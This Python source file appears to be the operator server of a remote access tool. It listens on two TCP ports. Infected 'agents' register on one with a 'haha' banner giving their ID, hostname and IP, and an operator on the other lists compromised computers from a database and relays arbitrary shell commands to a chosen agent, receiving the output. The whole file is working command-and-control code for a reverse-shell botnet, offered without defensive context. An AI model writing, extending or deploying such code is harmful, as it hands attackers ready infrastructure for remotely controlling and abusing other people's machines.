import os
import threading

from db import ComputerDatabase


class Server:
  def __init__(self, port1=9090, port2=9091, default_db_path=None):
    if default_db_path is None:
      default_db_path = os.environ.get(
        "DB_PATH",
        os.path.abspath(os.path.join(os.path.dirname(__file__), "../computers.db")),
      )
    self.default_db_path = default_db_path
    self.sessions = {}
    self.server_sockets = []
    self.port1 = port1
    self.port2 = port2

  def help_menu(self):
    return (
      "Available commands:\n"
      "help  - print this menu\n"
      "print - list registered agents from database\n"
      "0     - interact with agent by ID\n"
      "exit  - close operator session\n"
    )

  def handle_client(self, client_socket):
    banner = client_socket.recv(1024).decode(errors="replace").strip()
    if not banner.startswith("haha "):
      client_socket.close()
      return

    parts = banner.split()
    if len(parts) < 4:
      client_socket.close()
      return

    agent_id = parts[1]
    hostname = parts[2]
    local_ip = parts[3]
    self.sessions[str(agent_id)] = {
      "socket": client_socket,
      "hostname": hostname,
      "local_ip": local_ip,
    }
    print(f"[shell] Agent {agent_id} ({hostname} @ {local_ip}) connected")

  def work_with_customer(self, main_socket):
    main_socket.send(b"Type 'help' for commands\n>> ")
    while True:
      try:
        com = main_socket.recv(1024).decode().strip()
        if com == "0":
          main_socket.send(b"Agent ID: ")
          agent_id = main_socket.recv(1024).decode().strip()
          session = self.sessions.get(agent_id)
          if not session:
            main_socket.send(b"Agent not connected\n>> ")
            continue
          sock = session["socket"]
          main_socket.send(
            f"Relaying to agent {agent_id} ({session['hostname']})\n".encode()
          )
          while True:
            main_socket.send(b"shell>> ")
            command = main_socket.recv(4096).decode().strip()
            if command in ("exit", "back"):
              break
            sock.send((command + "\n").encode())
            ans = sock.recv(8192).decode(errors="replace")
            main_socket.send(ans.encode() or b"(no output)\n")
          main_socket.send(b">> ")
        elif com == "exit":
          main_socket.close()
          break
        elif com == "help":
          main_socket.send(self.help_menu().encode() + b"\n>> ")
        elif com == "print":
          db = ComputerDatabase(self.default_db_path)
          computers = db.get_computers()
          db.close()
          lines = [
            f"#{c['id']} {c.get('hostname','?')} {c['user']} {c['local_ip']} last={c.get('last_seen','?')}"
            for c in computers
          ]
          main_socket.send(("\n".join(lines) + "\n>> ").encode())
        else:
          main_socket.send(b"Unknown command. Type 'help'\n>> ")
      except (BrokenPipeError, ConnectionResetError):
        main_socket.close()
        break

  def accept_clients(self, port, handler):
    import socket as sock

    server_socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
    server_socket.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen()
    self.server_sockets.append(server_socket)
    print(f"[tcp] Listening on :{port}")

    while True:
      client_socket, addr = server_socket.accept()
      print(f"[tcp] Connection from {addr} on :{port}")
      threading.Thread(target=handler, args=(client_socket,), daemon=True).start()

  def run(self):
    t1 = threading.Thread(
      target=self.accept_clients, args=(self.port1, self.handle_client), daemon=True
    )
    t2 = threading.Thread(
      target=self.accept_clients,
      args=(self.port2, self.work_with_customer),
      daemon=True,
    )
    t1.start()
    t2.start()
    t1.join()
    t2.join()
